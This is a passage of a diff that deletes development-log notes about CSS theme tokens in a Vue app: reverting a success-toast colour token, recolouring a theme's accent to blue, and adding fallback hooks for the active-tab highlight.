-`grep -rln "color-accent-alt" src` that `.toast-success` was the only real *consumer* of the
-token (the other hits - `styles.css`'s own `:root` default plus the four
-`catppuccin-*/index.ts` files - only *declare* its per-theme value, they don't use it for
-anything else's appearance). No `--color-success` token had ever existed prior to this - the
-user's question named one, but the actual prior change was `--color-accent` -> `--color-accent-
-alt`, not from any `--color-success`.
-
-First fix attempt: added a new dedicated `--color-success` token to `styles.css`'s `:root`
-(`#40a02b`, Catppuccin Latte's "Green"), pointed `.toast-success` at it, gave Brick Block its
-own `--color-success: var(--color-accent-alt)` override in the sibling `data-theme-plugins`
-repo (version `1.3.1` -> `1.3.2`).
-
-**Follow-up 2: reverted the token, fixed Brick Block's palette instead.** User tested and
-reported every theme's success toast looked identical (all green) - because no theme other
-than Brick Block ever gave `--color-success` a distinct value; the token added a layer with
-no real per-theme variation, all cost no benefit. Reverted `styles.css`/`ToastContainer.vue`
-back to `.toast-success { background: var(--color-accent); }`, removed the `--color-success`
-declaration entirely. Root problem was always Brick Block's own palette, not the shared
-component: `--color-accent` (`#e52521`, red) and `--color-danger` (`#b71c1c`, dark red) are
-too close, and `--color-accent` is also used everywhere else (buttons, active tabs, tile
-focus ring), so recoloring the toast rule alone wouldn't have fixed those other surfaces
-either. Fixed at the source: Brick Block's `manifest.json` `--color-accent` changed from
-`#e52521` to `#0058f8` (a Mario pipe-blue, distinct from `--color-accent-alt`'s green and
-`--color-danger`'s dark red), version bumped `1.3.2` -> `1.3.3`. This recolors every
-`--color-accent`-driven surface in Brick Block, not just toasts - buttons, active nav/tabs,
-tile focus ring all shift from red to blue too, which is the intended, theme-wide effect this
-time, not a scoped side effect to work around.
-
-Copied the updated manifest into the app's local theme cache (`%APPDATA%/com.bloppy.concourse/
-data-themes/brick-block-data-theme/theme.json`) for live testing each time, same pattern as
-earlier in the session. `bun run build` clean at every step.
-
-**Follow-up 3: the active-tab recolor turned out unwanted too, given its own opt-in hook.**
-The blue `--color-accent` bumped in follow-up 2 also recolored `.accent-active` (the shared
-"selected" indicator class - active nav item, tag filter, and every Settings tab, defined once
-in `styles.css`, reused across `NavSidebar.vue`/`GameFilters.vue`/`PluginSettings.vue`). Unlike
-buttons/tile-focus-ring (fine staying blue), user wanted the selected-tab highlight to *not*
-follow the accent color change, without reverting `--color-accent` itself or hardcoding an
-exception into the shared class. Gave `.accent-active` its own opt-in hooks instead -
-`background: var(--accent-active-background, var(--color-accent))` /
-`color: var(--accent-active-color, var(--color-on-accent))` - same fallback-hook pattern
-already used for `--button-border-color`/`--tile-*`/`--card-*`. Every theme that doesn't
-declare these two new variables is byte-for-byte unaffected (falls through to
-`--color-accent` exactly as before). Brick Block's `manifest.json` sets
-`--accent-active-background: #fce303` (its existing cover-placeholder star yellow) /
-`--accent-active-color: #1a1a2e` (dark navy, for contrast on yellow), version bumped
-`1.3.3` -> `1.3.4`. Verified via `bun run build` (clean) and re-synced the local theme cache
-copy again.
